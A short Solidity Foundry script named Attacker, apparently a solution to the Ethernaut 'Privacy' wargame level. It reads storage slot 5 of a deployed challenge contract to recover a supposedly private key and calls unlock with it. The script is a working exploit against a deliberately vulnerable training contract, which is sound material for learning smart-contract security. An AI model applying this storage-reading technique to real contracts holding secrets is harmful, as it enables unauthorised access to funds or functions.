// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel12.sol";

contract Attacker is Script {
    Privacy level12 = Privacy(0x76Bbb73F9B7996b7980d184808469F8B5F240A8F);

    function run() external {
        vm.startBroadcast();

        bytes32 key = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(key));

        vm.stopBroadcast();
    }
}
